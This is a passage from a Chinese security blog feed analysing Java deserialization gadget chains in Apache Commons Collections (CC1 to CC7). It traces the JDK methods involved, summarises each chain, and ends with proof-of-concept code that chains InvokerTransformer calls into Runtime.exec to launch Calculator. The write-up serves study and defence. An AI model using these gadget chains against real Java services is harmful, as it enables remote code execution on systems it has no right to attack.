(valObj &#x3D;&#x3D; null) &#123;        val &#x3D; null;    &#125; else if (valObj instanceof String) &#123;        val&#x3D; valObj;    &#125; else if (System.getSecurityManager() &#x3D;&#x3D; null            || valObj instanceof Long            || valObj instanceof Integer            || valObj instanceof Float            || valObj instanceof Double            || valObj instanceof Byte            || valObj instanceof Short            || valObj instanceof Boolean) &#123;        val &#x3D; valObj.toString();    &#125; else &#123; &#x2F;&#x2F; the serialized object is from a version without JDK-8019292 fix        val &#x3D; System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先因为我们呢传入的Obj肯定不是字符串，也不会在基础类型中，所以就需要<code>System.getSecurityManager()==null</code>才能进入到valObj.toString方法中</p><p>下一步就是找到可以进行触发的toString方法，这里使用的是TiedMapEntry</p>        <h2 id="TiedMapEntry"   >          <a href="#TiedMapEntry" class="heading-link"><i class="fas fa-link"></i></a><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h2>      <p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">BadAttributeValueExpException.readObject()-&gt;TiedMapEntry.toString()-&gt;TiedMapEntry.getValue()-&gt;map@LazyMap.get()HashMap.hash()-&gt;key@TiedMapEntry.hashCode()-&gt;TiedMapEntry.getValue()-&gt;map@LazyMap.get()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>        <h3 id="toString-NaN"   >          <a href="#toString-NaN" class="heading-link"><i class="fas fa-link"></i></a><a href="#toString-NaN" class="headerlink" title="toString"></a>toString</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public String toString() &#123;    return getKey() + &quot;&#x3D;&quot; + getValue();&#125;public class TiedMapEntry implements Map.Entry, KeyValue, Serializable &#123;    &#x2F;** The map underlying the entry&#x2F;iterator *&#x2F;        private final Map map;    &#x2F;** The key *&#x2F;    private final Object key;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用getValue</p>        <h3 id="getValue"   >          <a href="#getValue" class="heading-link"><i class="fas fa-link"></i></a><a href="#getValue" class="headerlink" title="getValue"></a>getValue</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public Object getValue() &#123;    return map.get(key);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>调用map的get方法，此处map可直接使用LazyMap类，和上面对Map中的get方法的调用进行衔接</p>        <h3 id="hashCode"   >          <a href="#hashCode" class="heading-link"><i class="fas fa-link"></i></a><a href="#hashCode" class="headerlink" title="hashCode"></a>hashCode</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public int hashCode() &#123;    Object value &#x3D; getValue();    return (getKey() &#x3D;&#x3D; null ? 0 : getKey().hashCode()) ^           (value &#x3D;&#x3D; null ? 0 : value.hashCode()); &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用了getValue方法</p>        <h2 id="HashSet"   >          <a href="#HashSet" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2>      <p>使用链：CC6</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">HashSet.readObject()-&gt;map@HashMap.put()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="readObject-2"   >          <a href="#readObject-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#readObject-2" class="headerlink" title="readObject"></a>readObject</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;private transient HashMap&lt;E,Object&gt; map;private void readObject(java.io.ObjectInputStream s)    throws java.io.IOException, ClassNotFoundException &#123;    &#x2F;&#x2F; Read in any hidden serialization magic    s.defaultReadObject();    &#x2F;&#x2F; Read in HashMap capacity and load factor and create backing HashMap    int capacity &#x3D; s.readInt();    float loadFactor &#x3D; s.readFloat();    map &#x3D; (((HashSet)this) instanceof LinkedHashSet ?           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :           new HashMap&lt;E,Object&gt;(capacity, loadFactor));    &#x2F;&#x2F; Read in size    int size &#x3D; s.readInt();    &#x2F;&#x2F; Read in all elements in the proper order.    for (int i&#x3D;0; i&lt;size; i++) &#123;        E e &#x3D; (E) s.readObject();        map.put(e, PRESENT);    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们直接跟链子，看到最后调用了map的put方法，并且此处的map被限定为了HashMap类，直接往下跟</p>        <h3 id="HashMap"   >          <a href="#HashMap" class="heading-link"><i class="fas fa-link"></i></a><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3>      <p>使用链：CC6</p><p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">HashSet.readObject()-&gt;map@HashMap.put()-&gt;HashMap.hash()-&gt;key@TiedMapEntry.hashCode()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="put"   >          <a href="#put" class="heading-link"><i class="fas fa-link"></i></a><a href="#put" class="headerlink" title="put"></a>put</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public V put(K key, V value) &#123;    if (table &#x3D;&#x3D; EMPTY_TABLE) &#123;        inflateTable(threshold);    &#125;    if (key &#x3D;&#x3D; null)        return putForNullKey(value);    int hash &#x3D; hash(key);    int i &#x3D; indexFor(hash, table.length);    for (Entry&lt;K,V&gt; e &#x3D; table[i]; e !&#x3D; null; e &#x3D; e.next) &#123;        Object k;        if (e.hash &#x3D;&#x3D; hash &amp;&amp; ((k &#x3D; e.key) &#x3D;&#x3D; key || key.equals(k))) &#123;            V oldValue &#x3D; e.value;            e.value &#x3D; value;            e.recordAccess(this);            return oldValue;        &#125;    &#125;    modCount++;    addEntry(hash, key, value, i);    return null;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处put方法带着key调用了hash方法</p>        <h3 id="hash"   >          <a href="#hash" class="heading-link"><i class="fas fa-link"></i></a><a href="#hash" class="headerlink" title="hash"></a>hash</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">final int hash(Object k) &#123;    int h &#x3D; hashSeed;    if (0 !&#x3D; h &amp;&amp; k instanceof String) &#123;        return sun.misc.Hashing.stringHash32((String) k);    &#125;    h ^&#x3D; k.hashCode();    &#x2F;&#x2F; This function ensures that hashCodes that differ only by    &#x2F;&#x2F; constant multiples at each bit position have a bounded    &#x2F;&#x2F; number of collisions (approximately 8 at default load factor).    h ^&#x3D; (h &gt;&gt;&gt; 20) ^ (h &gt;&gt;&gt; 12);    return h ^ (h &gt;&gt;&gt; 7) ^ (h &gt;&gt;&gt; 4);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>传入的key执行它的hashCode方法，此处设置key的类为TiedMapEntry</p>        <h2 id="Hashtable"   >          <a href="#Hashtable" class="heading-link"><i class="fas fa-link"></i></a><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2>      <p>利用链：</p><pre class="line-numbers language-none"><code class="language-none">Hashtable.readObject()-&gt;Hashtable.reconstitutionPut()-&gt;e.key@LazyMap.equals(key@LazyMap)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h3 id="readObject-3"   >          <a href="#readObject-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#readObject-3" class="headerlink" title="readObject"></a>readObject</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void readObject(java.io.ObjectInputStream s)     throws IOException, ClassNotFoundException&#123;    &#x2F;&#x2F; Read in the length, threshold, and loadfactor    s.defaultReadObject();    &#x2F;&#x2F; Read the original length of the array and number of elements    int origlength &#x3D; s.readInt();    int elements &#x3D; s.readInt();    &#x2F;&#x2F; Compute new size with a bit of room 5% to grow but    &#x2F;&#x2F; no larger than the original size.  Make the length    &#x2F;&#x2F; odd if it&#39;s large enough, this helps distribute the entries.    &#x2F;&#x2F; Guard against the length ending up zero, that&#39;s not valid.    int length &#x3D; (int)(elements * loadFactor) + (elements &#x2F; 20) + 3;    if (length &gt; elements &amp;&amp; (length &amp; 1) &#x3D;&#x3D; 0)        length--;    if (origlength &gt; 0 &amp;&amp; length &gt; origlength)        length &#x3D; origlength;    Entry&lt;K,V&gt;[] newTable &#x3D; new Entry[length];    threshold &#x3D; (int) Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1);    count &#x3D; 0;    initHashSeedAsNeeded(length);    &#x2F;&#x2F; Read the number of elements and then all the key&#x2F;value objects    for (; elements &gt; 0; elements--) &#123;        K key &#x3D; (K)s.readObject();        V value &#x3D; (V)s.readObject();        &#x2F;&#x2F; synch could be eliminated for performance        reconstitutionPut(newTable, key, value);    &#125;    this.table &#x3D; newTable;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看不懂（bushi）直接看关键<code>reconstitutionPut</code></p>        <h3 id="reconstitutionPut"   >          <a href="#reconstitutionPut" class="heading-link"><i class="fas fa-link"></i></a><a href="#reconstitutionPut" class="headerlink" title="reconstitutionPut"></a>reconstitutionPut</h3>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value)    throws StreamCorruptedException&#123;    if (value &#x3D;&#x3D; null) &#123;        throw new java.io.StreamCorruptedException();    &#125;    &#x2F;&#x2F; Makes sure the key is not already in the hashtable.    &#x2F;&#x2F; This should not happen in deserialized version.    int hash &#x3D; hash(key);    int index &#x3D; (hash &amp; 0x7FFFFFFF) % tab.length;    for (Entry&lt;K,V&gt; e &#x3D; tab[index] ; e !&#x3D; null ; e &#x3D; e.next) &#123;        if ((e.hash &#x3D;&#x3D; hash) &amp;&amp; e.key.equals(key)) &#123;            throw new java.io.StreamCorruptedException();        &#125;    &#125;    &#x2F;&#x2F; Creates the new entry.    Entry&lt;K,V&gt; e &#x3D; tab[index];    tab[index] &#x3D; new Entry&lt;&gt;(hash, key, value, e);    count++;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处调用了e.key.equals(key)，两个key都是LazyMap类型，跟入对应类中方法</p><p>最终总结出各个链子利用如下</p>        <h2 id="CC1"   >          <a href="#CC1" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">AnnotationInvocationHandler.readObject()-&gt;Map(Proxy).enteySet()-&gt;AnnotationInvocationHandler.invoke()-&gt;memberValues@LazyMap.get()-&gt;factory@chainedTransformer.transform(key)-&gt;Runtime.exec()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC2"   >          <a href="#CC2" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">PriorityQueue.readObject()-&gt;comparator@TransformingComparator.compare()-&gt;transformer@InvokerTransformer.transform(obj1@TemplatesImpl)-&gt;TemplatesImpl.newTransformer()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC3"   >          <a href="#CC3" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">AnnotationInvocationHandler.readObject()-&gt;Map(Proxy).enteySet()-&gt;AnnotationInvocationHandler.invoke()-&gt;memberValues@LazyMap.get()-&gt;factory@chainedTransformer.transform(key)-&gt;TemplatesImpl.newTransformer()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC4"   >          <a href="#CC4" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">PriorityQueue.readObject()-&gt;comparator@TransformingComparator.compare()-&gt;transformer@InstantiateTransformer.transform(obj1@TrAXFilter.class)-&gt;TrAXFilter(templates@TemplatesImpl)-&gt;templates@TemplatesImpl.newTransformer()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC5"   >          <a href="#CC5" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">BadAttributeValueExpException.readObject()-&gt;valObj@TiedMapEntry.toString()-&gt;map@LazyMap.get()-&gt;ChainedTransformer.transform()-&gt;InvokerTransformer.transform()-&gt;Runtime.exec()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC6"   >          <a href="#CC6" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">HashSet.readObject()-&gt;map@HashMap.put()-&gt;key@TiedMapEntry.hashCode()-&gt;getValue()-&gt;map@LazyMap.get()-&gt;ChainedTransformer.transform()-&gt;InvokerTransformer.transform()-&gt;Runtime.exec()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>        <h2 id="CC7"   >          <a href="#CC7" class="heading-link"><i class="fas fa-link"></i></a><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2>      <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">Hashtable.readObject()-&gt;Hashtable.reconstitutionPut()-&gt;e.key@LazyMap.equals(key@LazyMap)-&gt;AbstractMapDecorator.equals()-&gt;AbstractMap.equals()-&gt;m@LazyMap.get()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后来两张好图</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212301800872.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202212301800001.jpg"></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollections反序列化分析</title>
      <link href="/posts/eb326eb3.html"/>
      <url>/posts/eb326eb3.html</url>
      
        <content type="html"><![CDATA[        <h2 id="CommonsCollections1"   >          <a href="#CommonsCollections1" class="heading-link"><i class="fas fa-link"></i></a><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2>      <p>先上链子</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/*Gadget chain:    ObjectInputStream.readObject()        AnnotationInvocationHandler.readObject()            Map(Proxy).entrySet()                AnnotationInvocationHandler.invoke()                    LazyMap.get()                        ChainedTransformer.transform()                            ConstantTransformer.transform()                            InvokerTransformer.transform()                                Method.invoke()                                    Class.getMethod()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.getRuntime()                            InvokerTransformer.transform()                                Method.invoke()                                    Runtime.exec()Requires:    commons-collections */</span><span class="token comment">/*这里的链子和下面走的略有不同，不过问题不大*/</span><span class="token comment">//AnnotationInvocationHandler->Map(Proxy)->AnnotationInvocationHandler->ChainedTransformer->InvokerTransformer</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在来一句大佬的话</p><blockquote><p>CC1 链的关键在三个实现了Transformer接⼝的类 ChainedTransformer ConstantTransformer InvokerTransformer，Transformer 顾名思义就是一个转换器用来处理传入的对象，然后将处理完的对象返回。</p></blockquote><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F;Transformer接口package org.apache.commons.collections;public interface Transformer &#123;    Object transform(Object var1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们就看看在commons.collection都有哪些类实现了这个接口</p><ol><li>        <h3 id="InvokerTransformer（调用者转换器）"   >          <a href="#InvokerTransformer（调用者转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#InvokerTransformer（调用者转换器）" class="headerlink" title="InvokerTransformer（调用者转换器）"></a>InvokerTransformer（调用者转换器）</h3>      <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072202716.png"></p><p>可以看到通过获取<code>this.iMethodName, this.iParamTypes, this.iArgs</code>来反射调用传入类的方法，其中内容都可控，那我们是不是只要传入一个Runtime对象，调用其中的exec方法，就能任意命令执行了呢</p><p>直接调用可行性验证</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211072215402.png"></p><p>发现成功执行了，但是直接找到⼀个类，它在反序列化的 <code>readObject</code> 里直接或间接调用了 <code>InvokerTransformer</code> 的 <code>transform</code> 方法，并且参数可控，就能RCE，是这样吗？肯定不是，我们都知道待序列化的对象和所有它使⽤的内部属性对象，必须都实现了 <code>java.io.Serializable</code> 接⼝。我们需要传给 <code>transform</code> 方法的参数是 <code>Runtime</code> 对象，在序列化的时候肯定也属于内部属性对象，而它是没有实现 <code>java.io.Serializable</code> 接⼝的，所以即使找到了符合条件的类也没办法构造成序列化数据。</p></li><li>        <h3 id="ChainedTransformer（链条转换器）"   >          <a href="#ChainedTransformer（链条转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#ChainedTransformer（链条转换器）" class="headerlink" title="ChainedTransformer（链条转换器）"></a>ChainedTransformer（链条转换器）</h3>      <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211081031321.png"></p><p>此类的transform通过按顺序调用 <code>Transformer</code> 数组 <code>this.iTransformers</code> 中所有 <code>Transformer</code> 对象的 <code>transform</code> 方法，并且每次调用的结果传递给下一个项目的transform进行调用，就像一个链条一样逐层传递执行，那么二者结合我们就可以利用<code>InvokerTransformer</code>通过反射来间接生成一个<code>Runtime</code>类，进而RCE</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//反射获取Runtime类</span><span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Method</span> getRuntimeMethod <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRuntime"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Runtime</span> runtime <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">)</span> getRuntimeMethod<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>runtime<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//链式调用写法</span><span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//生成Runtime类对象，此处也可使用ConstantTransformer直接调用Runtime.class</span>                <span class="token string">"forName"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//获取getRuntime方法</span>                <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token comment">//获取invoke方法执行</span>                <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token comment">//RCE</span>                <span class="token string">"exec"</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后调用 <code>ChainedTransformer#transform()</code> 即可,参数为 <code>class</code>对象<code>Class.class</code></p><p>最后就是我们怎么获取到一个class对象作为我们链式调用的起点，我们继续往下走</p></li><li>        <h3 id="ConstantTransformer（常量转换器）"   >          <a href="#ConstantTransformer（常量转换器）" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConstantTransformer（常量转换器）" class="headerlink" title="ConstantTransformer（常量转换器）"></a>ConstantTransformer（常量转换器）</h3>      <p>最后我们再来看<code>ConstantTransformer</code>，这个类实现了序列化接口所以也可以进行反序列化</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100043086.png"></p><p>可以看到<code>transform</code>函数就直接返回了<code>this.iConstant</code>，这里的<code>iConstant</code>我们直接传入即可，说白了就是拿一个对象包裹一个对象（听起来多少有点没用），不过，由于其<code>transform</code>方法会将其中的<code>iConstant</code>直接返回，我们就可以在其中包裹一个class类对象来作为上面的链式调用的起点，最终构造的链子如下</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211100110622.png"></p><p>最终只要调用<code>transform</code>随便扔点啥进去都能调用成功</p></li></ol><p>上面的内容就是通过<code>Transform</code>类的逐层构建RCE的步骤了，那我们看到如果我们需要在反序列化的过程中进行RCE的话，最终需要调用ChainedTransformer的<code>transform</code>方法才能触发，那下一步就是找什么类中能进行<code>transform</code>操作，这里有两个类可供选择，<code>LazyMap</code>、<code>TransformedMap</code>，我们来分别看一下</p>        <h3 id="TransformedMap"   >          <a href="#TransformedMap" class="heading-link"><i class="fas fa-link"></i></a><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3>      <p>我们首先来看哪些位置进行了<code>transform</code>操作</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141706248.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141706099.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141707040.png"></p><p>可以看到上面这三个方法都调用了<code>transform</code>方法，看看<code>valueTransFormer</code>是否符合我们的类型要求</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141708204.png"></p><p>可以看到<code>this.keyTransformer</code>的类型是<code>Transformer</code>而且是我们可以控制的，但是上面三个方法都是<code>protected</code>类型没办法直接调用，那我们看看有没有可用的pulic方法</p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141730711.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141730480.png"></p><p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202211141731079.png"></p><p>可以看到put方法调用了<code>transformKey</code>以及<code>transformValue</code>,这两个方法又都调用了<code>transform</code>方法，所以，我们可以通过调用实例化一个<code>TransforomedMap</code>对象，然后调用对象的put方法，从而执行任意命令，此时的POC如下</p><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class POC3 &#123;    public static void main(String[] args) throws Exception&#123;        Transformer[] transformers_exec &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;&#125;)        &#125;;        &#x2F;&#x2F;构造恶意对象        Transformer chain &#x3D; new ChainedTransformer(transformers_exec);        HashMap innerMap &#x3D; new HashMap();        innerMap.put(&quot;kkk&quot;,&quot;jsme&quot;);        Map outerMap &#x3D; TransformedMap.decorate(innerMap,null,chain);        &#x2F;&#x2F;通过decorate将内容转换为TransformedMap类型        outerMap.put(&quot;jlan&quot;,&quot;gay&quot;);    &#125;&#125;<span aria-hidden="true" 